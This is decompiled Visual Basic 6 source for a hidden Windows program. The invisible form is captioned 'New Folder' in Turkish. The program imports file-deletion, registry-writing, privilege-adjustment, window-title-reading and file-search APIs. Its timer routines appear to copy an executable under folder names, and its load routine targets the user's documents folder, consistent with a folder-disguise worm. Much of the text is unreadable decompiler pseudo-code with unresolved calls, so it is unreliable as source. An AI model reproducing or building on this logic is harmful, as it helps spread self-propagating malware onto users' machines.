VERSION 5.00
Begin VB.Form Form1
  Caption = "Yeni Klasör"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 0 'None
  Icon = "Form1.frx":0000
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  Visible = 0   'False
  ClientLeft = 17235
  ClientTop = 9795
  ClientWidth = 90
  ClientHeight = 90
  ShowInTaskbar = 0   'False
  Begin VB.Timer Timer12
    Interval = 1000
    Left = 120
    Top = 120
  End
  Begin VB.Frame Frame2
    Caption = "Frame2"
    Left = 360
    Top = 3960
    Width = 4215
    Height = 3255
    TabIndex = 4
    Begin VB.Timer Timer11
      Enabled = 0   'False
      Interval = 100
      Left = 3360
      Top = 1920
    End
    Begin VB.Timer Timer10
      Enabled = 0   'False
      Interval = 10
      Left = 3240
      Top = 1320
    End
    Begin VB.ListBox List4
      BackColor = &HE0E0E0&
      Left = 1560
      Top = 360
      Width = 1695
      Height = 1395
      TabIndex = 6
      Appearance = 0 'Flat
    End
    Begin VB.ListBox List1
      BackColor = &HE0E0E0&
      Left = 240
      Top = 360
      Width = 855
      Height = 2370
      TabIndex = 5
      List = "Form1.frx":0001346A
      ItemData = "Form1.frx":000134A2
      Appearance = 0 'Flat
    End
    Begin VB.Label Label7
      Left = 1920
      Top = 2040
      Width = 1335
      Height = 255
      TabIndex = 8
      BorderStyle = 1 'Fixed Single
    End
    Begin VB.Label Label8
      Left = 1920
      Top = 2520
      Width = 1335
      Height = 255
      TabIndex = 7
      BorderStyle = 1 'Fixed Single
    End
  End
  Begin VB.Timer Timer9
    Interval = 2000
    Left = 2760
    Top = 600
  End
  Begin VB.Timer Timer5
    Enabled = 0   'False
    Interval = 1000
    Left = 2520
    Top = 2880
  End
  Begin VB.Timer Timer2
    Enabled = 0   'False
    Interval = 10
    Left = 3120
    Top = 2400
  End
  Begin VB.Timer Timer8
    Enabled = 0   'False
    Interval = 1000
    Left = 3120
    Top = 1440
  End
  Begin VB.Frame Frame1
    Caption = "Tarih"
    Left = 240
    Top = 1920
    Width = 1935
    Height = 1335
    TabIndex = 1
    Begin VB.Timer Timer7
      Enabled = 0   'False
      Interval = 500
      Left = 120
      Top = 840
    End
    Begin VB.TextBox Text3
      Left = 600
      Top = 840
      Width = 1215
      Height = 285
      TabIndex = 3
    End
    Begin VB.TextBox Text1
      Left = 600
      Top = 360
      Width = 1215
      Height = 285
      TabIndex = 2
    End
    Begin VB.Timer Timer6
      Enabled = 0   'False
      Interval = 9000
      Left = 120
      Top = 360
    End
  End
  Begin VB.TextBox Text2
    BackColor = &HE0E0E0&
    Left = 1320
    Top = 1440
    Width = 1095
    Height = 285
    TabIndex = 0
    Appearance = 0 'Flat
  End
  Begin VB.Timer Timer4
    Enabled = 0   'False
    Interval = 5
    Left = 1560
    Top = 960
  End
  Begin VB.Timer Timer3
    Enabled = 0   'False
    Interval = 5
    Left = 1560
    Top = 600
  End
  Begin VB.Timer Timer1
    Interval = 1500
    Left = 360
    Top = 720
  End
End

Attribute VB_Name = "Form1"

'VA: 43A7F4
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
'VA: 43A7AC
Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
'VA: 43A768
Private Declare Function VerQueryValue Lib "version" Alias "VerQueryValueA" (pBlock As Any, ByVal lpSubBlock As String, ByVal lplpBuffer As Long, puLen As Long) As Long
'VA: 43A720
Private Declare Function GetFileVersionInfo Lib "version" Alias "GetFileVersionInfoA" (ByVal lptstrFilename As String, ByVal dwHandle As Long, ByVal dwLen As Long, lpData As Any) As Long
'VA: 43A6D4
Private Declare Function GetFileVersionInfoSize Lib "version" Alias "GetFileVersionInfoSizeA" (ByVal lptstrFilename As String, lpdwHandle As Long) As Long
'VA: 43A674
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
'VA: 43A628
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
'VA: 419470
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
'VA: 41942C
Private Declare Function RegCreateKey Lib "advapi32" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
'VA: 4193E4
Private Declare Sub OnudaSilloA Lib "advapi32"()
'VA: 419220
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'VA: 4191D8
Private Declare Function RegisterClass Lib "user32" Alias "RegisterClassA" (Class As WNDCLASS) As Long
'VA: 419190
Private Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
'VA: 419128
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
'VA: 4190DC
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
'VA: 41908C
Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LARGE_INTEGER) As Long
'VA: 41903C
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
'VA: 418FEC
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
'VA: 418FA8
Private Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
'VA: 418F60
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'VA: 418D24
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
'VA: 418CDC
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
'VA: 418C8C
Private Declare Function GetForegroundWindow Lib "user32" () As Long
'VA: 418C34
Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
'VA: 418BDC
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
'VA: 418B98
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
'VA: 418B38
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long

Private Type UDT_1_00418AC8
  bStruc(8) As Byte ' String fields: 0
End Type

Private Type UDT_2_00418AD4
  bStruc(592) As Byte ' String fields: 2
End Type


Private Sub Timer10_Timer() '443750
  loc_00443756: ext_4010EC
  loc_00443809: call var_8004 = global_00401070(00000001h, Me, 0, 0, 0)
  loc_00443826: call var_8008 = global_00401078(var_84, Form1.List4)
  loc_00443838: var_F4 = var_8008.UnkVCall_000000E0h
  loc_00443842: If var_F4 < 0 Then
  loc_00443856:   call var_800C = global_00401058(var_F4, var_8008, global_00418DC4, 000000E0h)
  loc_0044385C: End If
  loc_0044386D: call var_8010 = global_00401078(var_88, Form1.List4)
  loc_0044387F: var_F8 = var_8010.UnkVCall_000000D8h
  loc_00443889: If var_F8 < 0 Then
  loc_0044389D:   call var_8014 = global_00401058(var_F8, var_8010, global_00418DC4, 000000D8h)
  loc_004438A3: End If
  loc_004438D9: call var_8018 = global_0040102C(00000002h, var_84, var_88)
  loc_004438E9: If (var_F4 = 0) Then
  loc_00443900:   call var_801C = global_00401078(var_84, Form1.Timer11)
  loc_0044390D:   var_801C.UnkVCall_0000005Ch
  loc_00443914:   If var_801C.UnkVCall_0000005Ch < 0 Then
  loc_00443925:     call var_8020 = global_00401058(var_801C.UnkVCall_0000005Ch, var_801C, global_0041925C, 0000005Ch, var_801C, FFFFFFFFh)
  loc_0044392B:   End If
  loc_00443931:   call var_8024 = global_004011D4
  loc_00443948:   call var_8028 = global_00401078(var_84, Form1.Timer10)
  loc_00443950:   var_8028.UnkVCall_0000005Ch
  loc_00443957:   If var_8028.UnkVCall_0000005Ch < 0 Then
  loc_00443962:     call var_802C = global_00401058(var_8028.UnkVCall_0000005Ch, var_8028, global_0041925C, 0000005Ch, var_8028, 0)
  loc_00443968:   End If
  loc_0044396E:   call var_8030 = global_004011D4
  loc_00443979: Else
  loc_0044398A:   call var_8034 = global_00401078(var_84, Form1.List4)
  loc_00443999:   var_60 = var_8034.UnkVCall_000000F8h
  loc_004439A3:   If var_60 < 0 Then
  loc_004439B7:     call var_8038 = global_00401058(var_60, var_8034, global_00418DC4, 000000F8h)
  loc_004439BD:   End If
  loc_004439E7:   call var_803C = global_004011B4(var_B0, var_A0, 00000001h)
  loc_004439ED:   var_D8 = "\"
  loc_00443A12:   call var_8040 = global_00401078(var_88, Form1.Label8)
  loc_00443A1D:   var_64 = var_8040.UnkVCall_00000050h
  loc_00443A24:   If var_64 < 0 Then
  loc_00443A2F:     call var_8044 = global_00401058(var_64, var_8040, global_00419844, 00000050h)
  loc_00443A35:   End If
  loc_00443A39:   call var_8048 = global_00401018(var_64)
  loc_00443A46:   var_E8 = var_8048 + 1
  loc_00443A6C:   call var_804C = global_00401174(var_C0, var_E0, var_B0)
  loc_00443A81:   call var_8050 = global_004010E4(var_D0, var_F0, var_804C)
  loc_00443A88:   call var_8054 = global_00401090(var_8050)
  loc_00443A94:   call var_8058 = global_004011CC
  loc_00443AAA:   call var_805C = global_0040102C(00000002h, var_84, var_88)
  loc_00443AC7:   call var_8060 = global_00401024(00000003h, var_A0, var_B0, var_F0)
  loc_00443AD3:   If var_8054 Then
  loc_00443AEA:     call var_8064 = global_00401078(var_84, Form1.List4)
  loc_00443AF5:     var_60 = var_8064.UnkVCall_000000F8h
  loc_00443AFF:     If var_60 < 0 Then
  loc_00443B0D:       call var_8068 = global_00401058(var_60, var_8064, global_00418DC4, 000000F8h)
  loc_00443B13:     End If
  loc_00443B17:     call var_806C = global_00401018(var_60)
  loc_00443B26:     var_D8 = var_806C(-1)
  loc_00443B3F:     call var_8070 = global_00401010
  loc_00443B48:     call var_8074 = global_004011CC
  loc_00443B54:     call var_8078 = global_004011D4
  loc_00443B6B:     call var_807C = global_00401078(var_84, Form1.List4)
  loc_00443B76:     var_60 = var_807C.UnkVCall_000000F8h
  loc_00443B80:     If var_60 < 0 Then
  loc_00443B8E:       call var_8080 = global_00401058(var_60, var_807C, global_00418DC4, 000000F8h)
  loc_00443B94:     End If
  loc_00443BA5:     call var_8084 = global_00401078(var_88, Form1.Label7)
  loc_00443BCD:     call var_8088 = global_00401170(var_3C)
  loc_00443BE2:     call var_808C = global_004011A4(var_B0, var_A0, var_8088)
  loc_00443BF5:     call var_8090 = global_00401118(var_64, var_B0)
  loc_00443C05:     var_8090 = var_8084.UnkVCall_00000054h
  loc_00443C0C:     If var_8090 < 0 Then
  loc_00443C17:       call var_8094 = global_00401058(var_8090, var_8084, global_00419844, 00000054h)
  loc_00443C1D:     End If
  loc_00443C20:     call var_8098 = global_004011CC
  loc_00443C36:     call var_809C = global_0040102C(00000002h, var_84, var_88)
  loc_00443C4C:     call var_80A0 = global_00401024(00000002h, var_A0, var_B0)
  loc_00443C55:   End If
  loc_00443C66:   call var_80A4 = global_00401078(var_84, Form1.Label7)
  loc_00443C71:   var_60 = var_80A4.UnkVCall_00000050h
  loc_00443C78:   If var_60 < 0 Then
  loc_00443C83:     call var_80A8 = global_00401058(var_60, var_80A4, global_00419844, 00000050h)
  loc_00443C89:   End If
  loc_00443CB3:   call var_80AC = global_004011B4(var_B0, 8, 00000001h)
  loc_00443CC2:   call var_80B0 = global_00401010
  loc_00443CCE:   call var_80B4 = global_004011D4
  loc_00443CDA:   call var_80B8 = global_00401014
  loc_00443CF1:   call var_80BC = global_00401078(var_84, Form1.Label7)
  loc_00443CFC:   var_60 = var_80BC.UnkVCall_00000050h
  loc_00443D03:   If var_60 < 0 Then
  loc_00443D0E:     call var_80C0 = global_00401058(var_60, var_80BC, global_00419844, 00000050h)
  loc_00443D14:   End If
  loc_00443D18:   call var_80C4 = global_00401018(var_60)
  loc_00443D27:   var_D8 = var_80C4(-1)
  loc_00443D40:   call var_80C8 = global_00401010
  loc_00443D49:   call var_80CC = global_004011CC
  loc_00443D55:   call var_80D0 = global_004011D4
  loc_00443D5B:   var_D8 = "\"
  loc_00443D7A:   call var_80D4 = global_004010B8(&H8008, var_5C)
  loc_00443D83:   If var_80D4 Then
  loc_00443D9A:     call var_80D8 = global_00401078(var_84, Form1.List4)
  loc_00443DA5:     var_60 = var_80D8.UnkVCall_000000F8h
  loc_00443DAF:     If var_60 < 0 Then
  loc_00443DBD:       call var_80DC = global_00401058(var_60, var_80D8, global_00418DC4, 000000F8h)
  loc_00443DC3:     End If
  loc_00443DD4:     call var_80E0 = global_00401078(var_88, Form1.Label8)
  loc_00443DDF:     var_64 = var_80E0.UnkVCall_00000050h
  loc_00443DE6:     If var_64 < 0 Then
  loc_00443DF1:       call var_80E4 = global_00401058(var_64, var_80E0, global_00419844, 00000050h)
  loc_00443DF7:     End If
  loc_00443E05:     call var_80E8 = global_00401044(var_64, var_60)
  loc_00443E0C:     call var_80EC = global_004011AC
  loc_00443E18:     call var_80F0 = global_00401044(".exe", var_80EC)
  loc_00443E1A:     var_98 = var_80F0
  loc_00443E33:     call var_80F4 = global_00401120(var_A0, 00000000h)
  loc_00443E3E:     call var_80F8 = global_004011AC
  loc_00443E4A:     call var_80FC = global_004010B0(global_00418DE4, var_80F8)
  loc_00443E58:     var_E8 = var_80FC
  loc_00443E96:     call var_8100 = global_00401174(var_B0, &H800B, var_4C, var_F0)
  loc_00443EA4:     call var_8104 = global_004010E4(var_C0, var_8100)
  loc_00443EAB:     call var_8108 = global_00401090(var_8104)
  loc_00443ECA:     call var_810C = global_00401150(00000004h, var_60, var_64, var_68, var_6C)
  loc_00443EE0:     call var_8110 = global_0040102C(00000002h, var_84, var_88)
  loc_00443EF6:     call var_8114 = global_00401024(00000002h, var_A0, var_F0)
  loc_00443F07:     If var_8108 Then
  loc_00443F1E:       call var_8118 = global_00401078(var_88, Form1.List4)
  loc_00443F20:       var_104 = var_8118
  loc_00443F37:       call var_811C = global_00401078(var_84, Form1.List4)
  loc_00443F45:       var_F4 = var_811C.UnkVCall_000000E0h
  loc_00443F4F:       If var_F4 < 0 Then
  loc_00443F5D:         call var_8120 = global_00401058(var_F4, var_811C, global_00418DC4, 000000E0h)
  loc_00443F63:       End If
  loc_00443F7E:       var_F4(1) = var_104.UnkVCall_000000E4h
  loc_00443F88:       If var_F4(1) < 0 Then
  loc_00443F96:         call var_8124 = global_00401058(var_F4(1), var_104, global_00418DC4, 000000E4h)
  loc_00443F9C:       End If
  loc_00443FAC:       call var_8128 = global_0040102C(00000002h, var_84, var_88)
  loc_00443FC6:       call var_812C = global_00401078(var_84, Form1.Label8)
  loc_00443FD2:       global_00418DE4 = var_812C.UnkVCall_00000054h
  loc_00443FD9:       If global_00418DE4 < 0 Then
  loc_00443FE4:         call var_8130 = global_00401058(global_00418DE4, var_812C, global_00419844, 00000054h)
  loc_00443FEA:       End If
  loc_00443FF6:       call var_8134 = global_004011D4
  loc_00444009:       call var_8138 = global_00401078(var_84, Form1.Label7)
  loc_00444015:       global_00418DE4 = var_8138.UnkVCall_00000054h
  loc_0044401C:       If global_00418DE4 < 0 Then
  loc_00444027:         call var_813C = global_00401058(global_00418DE4, var_8138, global_00419844, 00000054h)
  loc_0044402D:       End If
  loc_00444033:       call var_8140 = global_004011D4
  loc_0044403A:     Else
  loc_00444041:       If global_00460558 = 0 Then
  loc_0044404D:         call var_8144 = global_00401134(global_00418EE0, global_00460558)
  loc_00444053:       End If
  loc_00444068:       var_84 = global_00460558.UnkVCall_00000014h
  loc_0044406F:       If var_84 < 0 Then
  loc_00444080:         call var_8148 = global_00401058(var_84, global_00460558, global_00418ED0, 00000014h)
  loc_00444086:       End If
  loc_00444099:       var_60 = var_84.UnkVCall_00000050h
  loc_004440A0:       If var_60 < 0 Then
  loc_004440B1:         call var_814C = global_00401058(var_60, var_84, global_00418EF0, 00000050h)
  loc_004440B7:       End If
  loc_004440BE:       If global_00460558 = 0 Then
  loc_004440CA:         call var_8150 = global_00401134(global_00418EE0, global_00460558)
  loc_004440D0:       End If
  loc_004440E5:       var_88 = global_00460558.UnkVCall_00000014h
  loc_004440EC:       If var_88 < 0 Then
  loc_004440FD:         call var_8154 = global_00401058(var_88, global_00460558, global_00418ED0, 00000014h)
  loc_00444103:       End If
  loc_00444116:       var_64 = var_88.UnkVCall_00000058h
  loc_0044411D:       If var_64 < 0 Then
  loc_0044412E:         call var_8158 = global_00401058(var_64, var_88, global_00418EF0, 00000058h)
  loc_00444134:       End If
  loc_00444145:       call var_815C = global_00401078(var_8C, Form1.List4)
  loc_00444154:       var_70 = var_815C.UnkVCall_000000F8h
  loc_0044415E:       If var_70 < 0 Then
  loc_00444172:         call var_8160 = global_00401058(var_70, var_815C, global_00418DC4, 000000F8h)
  loc_00444178:       End If
  loc_00444189:       call var_8164 = global_00401078(var_90, Form1.Label8)
  loc_00444198:       var_74 = var_8164.UnkVCall_00000050h
  loc_0044419F:       If var_74 < 0 Then
  loc_004441B0:         call var_8168 = global_00401058(var_74, var_8164, global_00419844, 00000050h)
  loc_004441B6:       End If
  loc_004441BE:       call var_816C = global_004011D4(var_74, var_70)
  loc_004441C5:       call var_8170 = global_004011AC
  loc_004441D1:       call var_8174 = global_004011D4(".exe", var_8170)
  loc_004441D8:       call var_8178 = global_004011AC
  loc_004441E8:       call var_817C = global_004011D4("\", var_60, var_8178)
  loc_004441EF:       call var_8180 = global_004011AC
  loc_004441FA:       call var_8184 = global_004011D4(var_64, var_8180)
  loc_00444201:       call var_8188 = global_004011AC
  loc_0044420D:       call var_818C = global_004011D4(".exe", var_8188)
  loc_00444214:       call var_8190 = global_004011AC
  loc_0044421B:       call var_8194 = global_00401158(var_8190)
  loc_00444247:       call var_8198 = global_00401150(00000009h, var_60, var_68, var_64, var_6C, var_70, var_74, var_78, var_7C, var_80)
  loc_0044426B:       call var_819C = global_0040102C(00000004h, var_84, var_88, var_8C, var_90)
  loc_00444285:       call var_81A0 = global_00401078(var_84, Form1.Label8)
  loc_00444291:       global_00418DE4 = var_81A0.UnkVCall_00000054h
  loc_00444298:       If global_00418DE4 < 0 Then
  loc_004442A3:         call var_81A4 = global_00401058(global_00418DE4, var_81A0, global_00419844, 00000054h)
  loc_004442A9:       End If
  loc_004442AF:       call var_81A8 = global_004011D4
  loc_004442C6:       call var_81AC = global_00401078(var_84, Form1.Label7)
  loc_004442D2:       global_00418DE4 = var_81AC.UnkVCall_00000054h
  loc_004442D9:       If global_00418DE4 < 0 Then
  loc_004442E4:         call var_81B0 = global_00401058(global_00418DE4, var_81AC, global_00419844, 00000054h)
  loc_004442EA:       End If
  loc_004442F0:       call var_81B4 = global_004011D4
  loc_00444307:       call var_81B8 = global_00401078(var_88, Form1.List4)
  loc_0044431C:       call var_81BC = global_00401078(var_84, Form1.List4)
  loc_0044432A:       var_F4 = var_81BC.UnkVCall_000000E0h
  loc_00444334:       If var_F4 < 0 Then
  loc_00444342:         call var_81C0 = global_00401058(var_F4, var_81BC, global_00418DC4, 000000E0h)
  loc_00444348:       End If
  loc_0044435D:       var_F4(1) = var_81B8.UnkVCall_000000E4h
  loc_00444367:       If var_F4(1) < 0 Then
  loc_00444375:         call var_81C4 = global_00401058(var_F4(1), var_81B8, global_00418DC4, 000000E4h)
  loc_0044437B:       End If
  loc_0044438B:       call var_81C8 = global_0040102C(00000002h, var_84, var_88)
  loc_00444399:     Else
  loc_004443AA:       call var_81CC = global_00401078(var_88, Form1.Label8)
  loc_004443AC:       var_104 = var_81CC
  loc_004443C3:       call var_81D0 = global_00401078(var_84, Form1.Label8)
  loc_004443CE:       var_60 = var_81D0.UnkVCall_00000050h
  loc_004443D5:       If var_60 < 0 Then
  loc_004443E0:         call var_81D4 = global_00401058(var_60, var_81D0, global_00419844, 00000050h)
  loc_004443E6:       End If
  loc_0044441A:       call var_81D8 = global_00401180(var_B0, var_A0, var_5C)
  loc_00444425:       call var_81DC = global_00401118(var_64, var_81D8)
  loc_00444435:       var_81DC = var_104.UnkVCall_00000054h
  loc_0044443C:       If var_81DC < 0 Then
  loc_00444447:         call var_81E0 = global_00401058(var_81DC, var_104, global_00419844, 00000054h)
  loc_0044444D:       End If
  loc_00444450:       call var_81E4 = global_004011CC
  loc_00444466:       call var_81E8 = global_0040102C(00000002h, var_84, var_88)
  loc_0044447C:       call var_81EC = global_00401024(00000002h, var_A0, var_B0)
  loc_00444496:       call var_81F0 = global_00401078(var_84, Form1.Label7)
  loc_004444A1:       var_60 = var_81F0.UnkVCall_00000050h
  loc_004444A8:       If var_60 < 0 Then
  loc_004444B3:         call var_81F4 = global_00401058(var_60, var_81F0, global_00419844, 00000050h)
  loc_004444B9:       End If
  loc_004444CA:       call var_81F8 = global_00401078(var_88, Form1.Label7)
  loc_004444D1:       var_60 = 0
  loc_004444D8:       var_98 = var_60
  loc_004444EC:       call var_81FC = global_00401170(var_2C)
  loc_00444501:       call var_8200 = global_004011A4(var_B0, var_A0, var_81FC)
  loc_00444514:       call var_8204 = global_00401118(var_64, var_B0)
  loc_0044451C:       var_8204 = var_81F8.UnkVCall_00000054h
  loc_00444523:       If var_8204 < 0 Then
  loc_0044452E:         call var_8208 = global_00401058(var_8204, var_81F8, global_00419844, 00000054h)
  loc_00444534:       End If
  loc_00444537:       call var_820C = global_004011CC
  loc_0044454D:       call var_8210 = global_0040102C(00000002h, var_84, var_88)
  loc_00444563:       call var_8214 = global_00401024(00000002h, var_A0, var_B0)
  loc_0044456C:       GoTo loc_004446A2
  loc_0044458B:       call var_8218 = global_00401078(var_88, Form1.List4)
  loc_0044458D:       var_104 = var_8218
  loc_004445A4:       call var_821C = global_00401078(var_84, Form1.List4)
  loc_004445B2:       var_F4 = var_821C.UnkVCall_000000E0h
  loc_004445BC:       If var_F4 < 0 Then
  loc_004445CA:         call var_8220 = global_00401058(var_F4, var_821C, global_00418DC4, 000000E0h)
  loc_004445D0:       End If
  loc_004445EB:       var_F4(1) = var_104.UnkVCall_000000E4h
  loc_004445F5:       If var_8220 < 0 Then
  loc_00444603:         call var_8224 = global_00401058(var_8220, var_104, global_00418DC4, 000000E4h)
  loc_00444609:       End If
  loc_00444619:       call var_8228 = global_0040102C(00000002h, var_84, var_88)
  loc_00444633:       call var_822C = global_00401078(var_84, Form1.Label7)
  loc_0044463F:       global_00418DE4 = var_822C.UnkVCall_00000054h
  loc_00444646:       If global_00418DE4 < 0 Then
  loc_00444651:         call var_8230 = global_00401058(global_00418DE4, var_822C, global_00419844, 00000054h)
  loc_00444657:       End If
  loc_00444663:       call var_8234 = global_004011D4
  loc_00444676:       call var_8238 = global_00401078(var_84, Form1.Label8)
  loc_00444682:       global_00418DE4 = var_8238.UnkVCall_00000054h
  loc_00444689:       If global_00418DE4 < 0 Then
  loc_00444694:         call var_823C = global_00401058(global_00418DE4, var_8238, global_00419844, 00000054h)
  loc_0044469A:       End If
  loc_004446A0:       call var_8240 = global_004011D4
  loc_004446A2:     End If
  loc_004446A2:   End If
  loc_004446A2: End If
  loc_004446A2: ' Referenced from: 0044456C
  loc_004446A2: call var_8244 = global_0040106C
  loc_004446AD: GoTo loc_00444727
  loc_004446D5: call var_8248 = global_00401150(00000009h, var_60, var_64, var_68, var_6C, var_70, var_74, var_78, var_7C, var_80, global_00444742)
  loc_004446F9: call var_824C = global_0040102C(00000004h, var_84, var_88, var_8C, var_90)
  loc_0044471D: call var_8250 = global_00401024(00000004h, var_A0, var_B0, var_C0, var_D0)
  loc_00444726: Exit Sub
  loc_00444727: ' Referenced from: 004446AD
  loc_00444730: call var_8254 = global_00401014
  loc_00444735: call var_8258 = global_00401014
  loc_0044473A: call var_825C = global_00401014
  loc_0044473F: call var_8260 = global_00401014
End Sub

Private Sub Form_Load() '43C220
  loc_0043C226: ext_4010EC
  loc_0043C23E: ext_40109C
  loc_0043C285: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_0043C299: If global_00460558 = 0 Then
  loc_0043C2A5:   call var_8008 = global_00401134(global_00418EE0, global_00460558)
  loc_0043C2AB:   var_18C = global_00460558
  loc_0043C2B7: Else
  loc_0043C2C1: End If
  loc_0043C2C9: var_150 = var_18C
  loc_0043C2E5: var_C8 = var_150.UnkVCall_00000014h
  loc_0043C2EA: var_154 = var_C8
  loc_0043C2F7: If var_154 < 0 Then
  loc_0043C30E:   call var_800C = global_00401058(var_154, var_150, global_00418ED0, 00000014h)
  loc_0043C314:   var_190 = var_800C
  loc_0043C31C: Else
  loc_0043C326: End If
  loc_0043C32C: var_158 = var_C8
  loc_0043C348: var_140 = var_158.UnkVCall_00000068h
  loc_0043C34D: var_15C = var_140
  loc_0043C35A: If var_15C < 0 Then
  loc_0043C371:   call var_8010 = global_00401058(var_15C, var_158, global_00418EF0, 00000068h)
  loc_0043C377:   var_194 = var_8010
  loc_0043C37F: Else
  loc_0043C389: End If
  loc_0043C39D: call var_8014 = global_004011D4
  loc_0043C3AC: If var_140 Then
  loc_0043C3B5:   call var_8018 = global_00401020
  loc_0043C3BB: End If
  loc_0043C3C9: var_801C = Proc_1_1_45B890(var_DC)
  loc_0043C3D4: call var_8020 = global_00401014
  loc_0043C3E1: var_8024 = Proc_2_2_45BCD0
  loc_0043C3F4: If global_00460558 = 0 Then
  loc_0043C400:   call var_8028 = global_00401134(global_00418EE0, global_00460558)
  loc_0043C406:   var_198 = global_00460558
  loc_0043C412: Else
  loc_0043C41C: End If
  loc_0043C424: var_150 = var_198
  loc_0043C440: var_C8 = var_150.UnkVCall_00000014h
  loc_0043C445: var_154 = var_C8
  loc_0043C452: If var_154 < 0 Then
  loc_0043C469:   call var_802C = global_00401058(var_154, var_150, global_00418ED0, 00000014h)
  loc_0043C46F:   var_19C = var_802C
  loc_0043C477: Else
  loc_0043C481: End If
  loc_0043C487: var_158 = var_C8
  loc_0043C4A3: var_A4 = var_158.UnkVCall_00000050h
  loc_0043C4A8: var_15C = var_A4
  loc_0043C4B5: If var_15C < 0 Then
  loc_0043C4CC:   call var_8030 = global_00401058(var_15C, var_158, global_00418EF0, 00000050h)
  loc_0043C4D2:   var_1A0 = var_8030
  loc_0043C4DA: Else
  loc_0043C4E4: End If
  loc_0043C500: var_F4 = var_A4
  loc_0043C51A: call var_8034 = global_00401044(global_00419240, global_00419238)
  loc_0043C528: call var_8038 = global_004011AC
  loc_0043C534: call var_803C = global_00401044(global_00419240, var_8038)
  loc_0043C542: call var_8040 = global_004011AC
  loc_0043C54E: call var_8044 = global_00401044("da", var_8040)
  loc_0043C55C: call var_8048 = global_004011AC
  loc_0043C568: call var_804C = global_00401044("ta", var_8048)
  loc_0043C56E: var_D4 = var_804C
  loc_0043C58C: call var_8050 = global_00401064(var_EC, var_DC)
  loc_0043C5A0: call var_8054 = global_004010B8(var_EC, var_FC)
  loc_0043C5C4: call var_8058 = global_00401150(00000003h, var_A8, var_AC, var_B0)
  loc_0043C5D3: call var_805C = global_004011D4
  loc_0043C5F0: call var_8060 = global_00401024(00000003h, var_DC, var_FC, var_EC)
  loc_0043C602: If var_8054 Then
  loc_0043C626:   call var_8064 = global_00401078(var_C8, Form1.Timer3)
  loc_0043C62C:   var_150 = var_8064
  loc_0043C643:   var_150.UnkVCall_0000005Ch
  loc_0043C648:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043C655:   If var_154 < 0 Then
  loc_0043C66C:     call var_8068 = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043C672:     var_1A4 = var_8068
  loc_0043C67A:   Else
  loc_0043C684:   End If
  loc_0043C68A:   call var_806C = global_004011D4
  loc_0043C6B4:   call var_8070 = global_00401010
  loc_0043C6DE:   call var_8074 = global_00401010
  loc_0043C70B:   call var_8078 = global_00401010
  loc_0043C738:   call var_807C = global_00401010
  loc_0043C762:   call var_8080 = global_00401010
  loc_0043C78C:   call var_8084 = global_00401010
  loc_0043C7B6:   call var_8088 = global_00401010
  loc_0043C7E0:   call var_808C = global_00401010
  loc_0043C804:   call var_8090 = global_00401078(var_C8, Form1.List1)
  loc_0043C80A:   var_150 = var_8090
  loc_0043C824:   var_114 = "userprofile"
  loc_0043C844:   call var_8094 = global_0040118C
  loc_0043C858:   call var_8098 = global_00401064(var_EC, var_DC)
  loc_0043C85E:   var_124 = "\Belgelerim\"
  loc_0043C877:   ext_40109C
  loc_0043C8B6:   call var_809C = global_00401180(var_FC, 8, var_EC, 10)
  loc_0043C8C4:   call var_80A0 = global_00401118(var_A4)
